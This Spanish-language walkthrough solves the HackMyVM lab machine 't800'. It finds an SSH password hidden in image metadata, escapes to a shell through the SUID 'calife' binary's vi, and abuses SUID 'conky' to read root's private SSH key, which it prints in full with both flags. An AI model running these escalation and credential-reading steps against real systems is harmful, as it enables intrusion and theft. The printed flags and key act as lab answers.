---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# t800 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 11:15 EDT
Nmap scan report for 192.168.28.22
Host is up (0.00086s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
800/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b6:be:5a:0b:ec:0b:53:69:b6:7b:54:46:7d:40:56:75 (RSA)
|   256 a3:3c:a5:67:ba:42:94:04:49:47:24:30:63:91:ef:c3 (ECDSA)
|_  256 b2:75:86:d8:45:99:9a:9d:89:10:41:9a:d0:03:6c:a8 (ED25519)
MAC Address: 08:00:27:40:81:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

Veremos que hay un puerto `80` en el que esta alojada una pagina web, vamos a ver que contiene, si entramos dentro veremos una imagen de un señor, pero poco mas, por lo que vamos a realizar un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.22/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 160]
/robots.txt           (Status: 200) [Size: 13]
/robots.txt           (Status: 200) [Size: 13]
/sexy                 (Status: 403) [Size: 169]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay `2` rutas interesantes, entre ellas la llamada `sexy` y la otra llamada `robots.txt`, vamos a ver que hay en el `robots.txt`:

```
URL = http://<IP>/robots.txt
```

Info:

```
/sexy/*.jpeg
```

Veremos que tendremos que realizar `fuzzing` en busca de una imagen en la pagina del directorio llamado `sexy`, por lo que haremos lo siguiente:

```shell
gobuster dir -u http://<IP>/sexy/ -w <WORDLIST> -x jpeg -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.22/sexy/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpeg
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/nudeslut.jpeg        (Status: 200) [Size: 11863]

```

Veremos que nos ha encontrado una imagen, por lo que vamos a ver que contiene:

```shell
curl -O http://<IP>/sexy/nudeslut.jpeg
```

Si la abrimos veremos una imagen del mismo hombre pero con otra pose, por lo que vamos a ver si a nivel de `metadatos` vemos algo interesante:

## exiftool

```shell
exiftool nudeslut.jpeg
```

Info:

```
ExifTool Version Number         : 13.10
File Name                       : nudeslut.jpeg
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2025:04:25 11:09:41-04:00
File Access Date/Time           : 2025:04:25 11:09:41-04:00
File Inode Change Date/Time     : 2025:04:25 11:09:41-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : passwd:chmodxheart
Image Width                     : 275
Image Height                    : 183
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 275x183
Megapixels                      : 0.050
```

Veremos algo muy interesante en los `metadatos` y es que hay unas credenciales en ellos, por lo que vamos a probarlo con el servidor `SSH` de la siguiente forma:

### SSH

Si miramos en la pagina principal el codigo veremos esta parte del codigo en `HTML`:

```html
<!-- Im ruut-->
```

Vemos lo que parece ser un nombre de usuario, por lo que vamos a probarlo por `SSH`.

```shell
ssh ruut@<IP> -p 800
```

Metemos como contraseña `chmodxheart` y veremos que estamos dentro.

Info:

```
The authenticity of host '[192.168.28.22]:800 ([192.168.28.22]:800)' can't be established.
ED25519 key fingerprint is SHA256:NQDCK+YQrbsHYi1VtpjQA0dziHvQ5rqh5HTcD1GL/lo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.28.22]:800' (ED25519) to the list of known hosts.
ruut@192.168.28.22's password: 
Linux t800 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr  8 08:20:55 2021 from 192.168.1.58
ruut@t800:~$ whoami
ruut
```

## Escalate user superruut

Si listamos los permisos `SUID` veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
137981    704 -rwsr-sr-x   1 root     root       718872 May 15  2018 /usr/bin/conky
   131121     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   134473     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   134620     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
   134946     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
   137759     20 -rwsr-xr-x   1 root     root        19016 Mar 27  2018 /usr/bin/calife
   131120     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   131118     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   131117     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   134948     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   146938    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   268129     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   135697     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos esta linea de aqui:

```
137981  704 -rwsr-sr-x   1 root   root   718872 May 15  2018 /usr/bin/conky
```

Y seguidamente esta:

```
137759   20 -rwsr-xr-x   1 root   root    19016 Mar 27  2018 /usr/bin/calife
```

Veremos que esos `binarios` no suelen ser muy comunes, por lo que vamos a investigar a ver que hacen:

En el `binario` `conky` no veremos gran cosa, pero si buscamos con `calife` veremos lo siguiente:

URL = [Manual binario calife](https://man.freebsd.org/cgi/man.cgi?query=calife.auth\&sektion=5\&apropos=0\&manpath=FreeBSD+13.0-RELEASE+and+Ports)

Vemos que si ejecutamos el binario junto con el nombre de un usuario podremos obtener una `shell` de dicho usuario, vamos a probar con `root`:

Tambien lo podemos descubrir por que si intentamos obtener la ayuda del `binario` veremos lo siguiente:

```
Unknown user --help.
```

Nos indica que no es un usuario `valido` por lo que vamos a intentar con `root`:

```shell
/usr/bin/calife root
```

Metemos como contraseña `chmodxheart` pero no nos dejara, por lo que vamos a probar con el otro usuario llamado `superruut`:

```shell
/usr/bin/calife superruut
```

Metemos como contraseña `chmodxheart` y nos llevara a un editor de texto `vi` por lo que vamos aprobechar eso enviando un comando para obtener una `shell` de la siguiente forma:

```shell
:set shell=/bin/bash
:shell
```

Info:

```
superruut@t800:/etc$ whoami
superruut
```

Con esto veremos que seremos dicho usuario, por lo que leeremos la `flag` del usuario:

> userflag.txt

```
ruutrulezhmv
```

## Escalate Privileges

Como antes hemos visto tenemos con permisos `SUID` el `binario` `conky` por lo que vamos a investigar sobre el.

Si investigamos veremos que desde los archivos de configuracion si el `out_to_console` esta en `True` podremos `exfiltrar` informacion que nosotros modifiquemos dentro de dicho archivo, por lo que podremos hacer lo siguiente:

Primero vamos a ver donde se encuentra el archivo de configuracion:

```shell
find / -name "conky*" 2>/dev/null
```

Info:

```
/etc/conky
/etc/conky/conky_no_x11.conf
/etc/conky/conky.conf
/usr/bin/conky
/usr/share/doc-base/conky-manual
/usr/share/apport/package-hooks/conky.py
/usr/share/doc/conky
/usr/share/doc/conky-std
/usr/share/doc/conky-std/conky_no_x11.conf
/usr/share/doc/conky-std/conky.conf
/usr/share/vim/addons/ftdetect/conkyrc.vim
/usr/share/vim/addons/syntax/conkyrc.vim
/usr/share/man/man1/conky.1.gz
/var/lib/dpkg/info/conky-std.md5sums
/var/lib/dpkg/info/conky-std.list
/var/lib/dpkg/info/conky.list
/var/lib/dpkg/info/conky-std.conffiles
/var/lib/dpkg/info/conky.md5sums
/var/cache/apt/archives/conky_1.10.8-1_all.deb
/var/cache/apt/archives/conky-std_1.10.8-1+b1_amd64.deb
```

Veremos que el que nos interesa es el siguiente:

```
/etc/conky/conky.conf
```

Pero si leemos el archivo veremos lo siguiente:

```
conky.config = {
    alignment = 'top_left',
    background = false,
    border_width = 1,
    cpu_avg_samples = 2,
      default_color = 'white',
    default_outline_color = 'white',
    default_shade_color = 'white',
    draw_borders = false,
    draw_graph_borders = true,
    draw_outline = false,
    draw_shades = false,
    use_xft = true,
    font = 'DejaVu Sans Mono:size=12',
    gap_x = 5,
    gap_y = 60,
    minimum_height = 5,
      minimum_width = 5,
    net_avg_samples = 2,
    no_buffers = true,
    out_to_console = false,
    out_to_stderr = false,
    extra_newline = false,
    own_window = true,
    own_window_class = 'Conky',
    own_window_type = 'desktop',
    stippled_borders = 0,
    update_interval = 1.0,
    uppercase = false,
    use_spacer = 'none',
    show_graph_scale = false,
    show_graph_range = false
}
```

Por lo que vemos la opcion que necesitamos esta desactivada, por lo que vamos a crear un archivo de configuracion en nuestra `/home` de la siguiente forma:

```shell
nano /home/superruut/conky.conf

#Dentro del nano
conky.config = {
       out_to_console = true,  # <--------- Modificamos esta parte de aqui
       out_to_x = false,
}

conky.text = [[
${tail /root/.ssh/id_rsa 30} # Añadimos esto de aqui para poder leer la id_rsa de root (Si existiera)
]]
```

Vamos a ver si con esto funciona, ahora ejecutamos el `binario` para probarlo:

```shell
conky -c /home/superruut/conky.conf
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA9qeXI0DQ29nXEAmGT7bQo0ZCAJkEwTTcIDwpWvqe/u4iBThfwW1f
d9IigvM+GKq43bde3p6xBFTC5/ZO1bWN/g0Pi3GVmsScOuZanV/PQiZ4UnmeFV5fevm6ED
piwXKKCKxGUS/vkLt4n9gNkmbjnTTzWVgJe9MhFOKEkzUQFwn/pIBT3H0D/N5A7Yxu4FiF
2FQUZqacBJU+m/iHL4ep/2j+IcDzjSPI3RGwuOW+qrJPg5rGeJt4JhuicobXip5W3f2cyx
tBazXKFOCcpZD068j9zbM5j6TxpLNK0+fDVeBv9sK4mbdCbO62Xms2+4IWKZQl20sFSKKe
EsuMtD5hhQAAA8Cn+gd6p/oHegAAAAdzc2gtcnNhAAABAQD2p5cjQNDb2dcQCYZPttCjRk
IAmQTBNNwgPCla+p7+7iIFOF/BbV930iKC8z4Yqrjdt17enrEEVMLn9k7VtY3+DQ+LcZWa
xJw65lqdX89CJnhSeZ4VXl96+boQOmLBcooIrEZRL++Qu3if2A2SZuOdNPNZWAl70yEU4o
STNRAXCf+kgFPcfQP83kDtjG7gWIXYVBRmppwElT6b+Icvh6n/aP4hwPONI8jdEbC45b6q
sk+DmsZ4m3gmG6JyhteKnlbd/ZzLG0FrNcoU4JylkPTryP3NszmPpPGks0rT58NV4G/2wr
iZt0Js7rZeazb7ghYplCXbSwVIop4Sy4y0PmGFAAAAAwEAAQAAAQB0tI1Vl9h6/dK9etQ7
KXQEnTyjjcNrK3iwI+cpbgYG92PPdoIQQpD2X84GidMq1rSL67SOvyVguD5UhP1+Lt5Vg5
aEUyUHStnlIJNlfSzSzuMFmxfKYpHo3PpFrWqGv4xCWEkZJwZCRAHqF88sI1S1UJWIA5jR
Ju+zMw6pnGTVkO7B+f6IQCNdKVXYcyjvMmgia3F8FymGxLjLF3gjZ5y+BeyH7WU7NUbTJz
UycA8KeIwet0yxDb99DyHNNw2jY4QvOYSqJbkmKCOPv4QSji+qVvcY5UHPLFpa65rMai15
MkNAic3cHZnOjTAxmOiGWFjLNSjOoOjl+2+YsPLiC2ohAAAAgCM8OD2TcU9IoViI3Q126J
vskHgBTCT0uFHcF8JoiWZx3OcMbtIg+ClXpvOiMDbNuRLStMvW6CvaANz9qPr6fpz6uQsz
BisQVyF6YigjPIfhkuJ3ThkwMjVGSxpghzUVjUXbaX+nAeWK5yM081/qEBW+n9VktYmWsj
0Vo9SO/d2+AAAAgQD8F15FPhU50yOxOVwrx6+YTz71zgG1C3G9R6Ie1EuY4GbTpW5IqHeP
izBlAKPh2veQhaPbonvKjhzGVdsRIrS3j4uYQVUeyqeqR07BjgWFMu8NEDuF+H8QxWbLVh
fFFqaUkw4++OZMsez7lfB/k/pkSoSY5tsf5Pbtq/pgKaEyjQAAAIEA+nqkc4BCKd5VDLJK
KC4ORY8QJoAzuF7azzTqDvC2vJPtkEElm1fE4iDQ/OoA+jBhyU84umffuagnr2vT2WgkeO
L99/4JC4VCcmTFi8mVkpK6zf4/M8GQckso0cAyTXT/UhMYnw9fUj4EF8S6/nmxjuMyfQxD
6ewvAde96sKmqNkAAAAJcm9vdEB0ODAwAQI=
-----END OPENSSH PRIVATE KEY-----
```

Veremos que ha funcionado de forma correcta, por lo que haremos lo siguiente:

> Maquina Host

```shell
nano id_rsa

#Dentro del nano
<ID_RSA_ROOT>
```

Lo guardamos y establecemos los permisos necesarios:

```shell
chmod 600 id_rsa
```

Ahora vamos a conectarnos mediante la clave `PEM` de la siguiente forma:

```shell
ssh -i id_rsa root@<IP> -p 800
```

Info:

```
Linux t800 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr  8 08:18:02 2021
root@t800:~# whoami
root
```

Con esto ya seremos `root` por lo que leeremos la `flag` de `root`:

> rootflag.txt

```
hmvtitoroot
```
